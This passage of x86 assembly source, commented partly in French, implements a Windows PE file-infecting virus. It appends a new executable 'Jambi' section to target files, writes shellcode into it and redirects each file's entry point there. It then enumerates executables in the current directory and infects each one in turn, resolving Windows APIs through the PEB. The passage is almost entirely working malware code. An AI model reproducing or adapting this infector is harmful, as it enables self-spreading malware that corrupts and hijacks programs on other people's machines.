	mov	ebx, [ebp - 20]
	sub	ebx, 40 ; jumping to Jambi's previous section

	add	ebx, 8 ; accessing Misc.VirtualSize

	mov	eax, [ebx]
	add	ebx, 4 ; accessing VirtualAddress
	add	eax, [ebx]

	push	eax
	push	[ebp - 28]
	call	alignment

	add	ebx, 40 ; jumping to Jambi section
	mov	[ebx], eax ; setting jambi virtual address

	; Setting  SizeOfRawData = AligneSur(fileAlignment,tailleSection);
	add	ebx , 4

	mov	eax, [ebp  - 60]
	push	eax
	push	[ebp - 32]
	call	alignment

	mov	[ebx], eax

	; Setting  PointerToRawData -> AligneSur(fileAlignment,(infosSection->SizeOfRawData + infosSection->PointerToRawData));
	sub	ebx, 40
	mov	edx, [ebx]

	add	ebx , 4
	add	edx, [ebx]

	push	edx
	push 	[ebp - 32]
	call	alignment

	add	ebx, 40
	mov	[ebx], eax


	xor	eax, eax
	;PointerToRelocations = 0;
	add	ebx, 4
	mov	[ebx], eax
	    ;PointerToLinenumbers = 0;
	add	ebx, 4
	mov	[ebx], eax
	    ;NumberOfRelocations = 0;
	add	ebx, 4
	mov	[ebx], eax
	    ;NumberOfLinenumbers = 0;
	add	ebx, 2
	mov	[ebx], eax
	; Caracteritics
	add	ebx, 2
	mov	edx, IMAGE_SCN_MEM_READ
	add	edx, IMAGE_SCN_MEM_WRITE
	add	edx, IMAGE_SCN_MEM_EXECUTE
	mov	[ebx], edx

	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	; Setting new entry point
	;~~~~~~~~~~~~~~~~~~~~~~~~~~
	mov	ebx, [ebp - 16]
	add	ebx, 40 ; offset to AddressOfEntryPoint

	mov	edx, [ebp - 20]
	add	edx, 12

	mov	eax, [edx]
	mov	[ebx], eax

	; saving PointerToRawData from our section
	mov	edx, [ebp - 20]
	add	edx, 20
	push	[edx]
	pop	[ebp - 40]

	; calcul de l'addresse pour copier l'addresse du jump
	mov	edx, [ebp - 20] ; PIMAGE_SECTION_HEADER
	add	edx, 12
	mov	edx, [edx]

	mov	eax, [ebp - 16]
	add	eax, 52 ; offset to ImageBase
	mov	eax, [eax]
	add	edx, eax

	mov	eax, [ebp  - 60]
	add	edx, eax

	mov	eax, [ebp - 24]

	sub	eax, edx
	mov	[ebp - 44], eax

	; Clean up all
	push	[ebp - 12]
	call	dword ptr [ebp - 260]

	push	[ebp - 8]
	call	dword ptr [ebp - 296]
	cmp	eax, 0
	je	_error9

	push	[ebp - 4]
	call	dword ptr [ebp - 296]
	cmp	eax, 0
	je	_error10

	;-------------------------------------------------------
	; CrateFile
	xor 	ebx, ebx

	push	ebx ; ebx is null
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_ALWAYS
	push	ebx ; ebx is null
	push	FILE_SHARE_WRITE
	push 	GENERIC_WRITE
	push 	[ebp + 8]
	call	dword ptr [ebp - 228]

	cmp	eax, INVALID_HANDLE_VALUE
	je	_error6

	mov	[ebp - 36], eax

	; SetFilePointer(fp,pointerToRaw,0,FILE_BEGIN);
	push	FILE_BEGIN
	push	ebx
	push	[ebp - 40]
	push	eax
	call	dword ptr [ebp - 256]

	cmp	eax, INVALID_SET_FILE_POINTER
	je	_error7
	cmp	eax, ebx ; ebx is null
	jb	_error7

	mov	edx, ebp
	sub	edx, 8

	; WriteFile shellcode
	push	ebx
	push	edx	; [ebp - 8]
	mov	ecx, [ebp  - 56] ; shellcode size - jump_size -> sizeof(dword)
	push	ecx
	push	[ebp - 52]
	push	[ebp - 36]
	call	dword ptr [ebp - 264]

	cmp	eax, ebx ; ebx is null
	jb	_error8


	mov	edx, ebp
	sub	edx, 8 ; dummy

	mov	eax, ebp
	sub	eax, 44

	; WriteFile entrypoint a la suite du shellcode
	push	ebx
	push	edx
	push	4
	push	eax
	push	[ebp - 36]
	call	dword ptr [ebp - 264]

	cmp	eax, ebx ; ebx is null
	jb	_error8

	mov	ebx, [ebp  - 60]
	push	ebx
	push	[ebp - 32]
	call	alignment

	mov	edx, ebx
	mov	ebx, eax
	sub	ebx, edx

	; Filling with nop
	;on complete par des nop pour avoir la meme taille que ce que l'on a mis dans l'entete d'information.
	finalize:
	mov	edx, ebp
	sub	edx, 8 ; dummy

	push	0
	push	edx
	push	1
	push	offset binary_noop
	push	[ebp - 36]
	call	dword ptr [ebp - 264]

	cmp	eax, 0 ; ebx is null
	jb	_error8

	dec	ebx
	or	ebx, ebx
	jne	finalize

	push	[ebp - 36]
	call	dword ptr [ebp - 296]

	mov	eax, 42

	leave
	ret	4

find_first_file:
	push	ebp
	mov	ebp, esp
	; Buffer de 512 octects.
	sub	esp, 516   ; struct de fichier (WIN32_FIND_DATA) + handle
	mov	ebx, ebp
	sub	ebx, 512

	;; FindFirstFile(TCHAR [], WIN32_FIND_DATA)
	push	ebx
	push	[ebp + 8]
	call	dword ptr [ebp + 12] ; FindFirstFile

	cmp	eax, -1
	je	_error11

	mov 	[ebp - 516], eax
	add	ebx, 44	    ; cFilename

	push	[ebp + 20]  ; pour find (ExitProcess)
	push	[ebp + 16]  ; pour find (findnextfile)
	push	[ebp - 516] ; pour find
	push	ebx         ; pour infect
here:
	call	infect
	call	find_next_execs
	push	[ebp + 20]  ; pour find (ExitProcess)
	push	[ebp + 16]  ; pour find (findnextfile)
	push	eax	    ; pour find
	push	ebx	    ; pour infect (le nom)
	or	eax, eax
	jne	short	here

	leave
	ret	16

find_next_execs:
	push	ebp
 	mov	ebp, esp
	sub	esp, 512

	;; FindNextFile(handler, win32_find_data)
	mov	eax, ebp
	sub	eax, 512
	push	eax
	push	[ebp + 8]
	call	dword ptr [ebp + 12] ; findnextfile

	or	eax, eax
	je	_error12

	mov	ebx, ebp
	sub	ebx, 512
	add	ebx, 44

	mov	eax,  [ebp + 8]
	leave
	ret	12

ls:
	push	ebp
	mov	ebp, esp

	; Buffer de 512 octects.
	sub	esp, 1024   ;MAX_PATH (260) + 7


	;; on load les libs
	mov	eax, 42
	mov	[ebp - 196], ls_label ; magic number
	jmp	peb

ls_label:

	mov	ebx, ebp
	sub	ebx, 1024

	; appel GetCurrentDirectory
	push	ebx
	push	512
	call	dword ptr [ebp - 244]

	;; strcat(buffer, "\*")
	push	offset	execpattern
	push	ebx
	call	dword ptr [ebp - 248]

	push	dword ptr [ebp - 236]	; ExitProcess
	push	dword ptr [ebp - 300]	; find next
	push	dword ptr [ebp - 240]	; first file
	push	ebx
 	call	find_first_file

	push	0
	call	dword ptr [ebp - 236]				; on exit
	leave
	ret

start:
	call	ls
	push	eax
	pop	eax

	;; debugging popup

very_first:

	sub	ebp, 1024
	mov	[ebp - 196], @@lola
	jmp peb
	@@lola:
	push	0
	push	[ebp - 516]
	push	[ebp - 516]
	push	0
	call	dword ptr [ebp - 268]

very_last:
;; very_first:
;; 	jmp @@lili
;; @@lola:
;; 	db	"~[popup'title]~", 0
;; @@lili:
;; 	push	0
;; 	push	offset  @@lola
;; 	push	offset	@@lola
;; 	push	0
;; 	call	MessageBoxA
;; 	db	233d
;; very_last:

	end	start
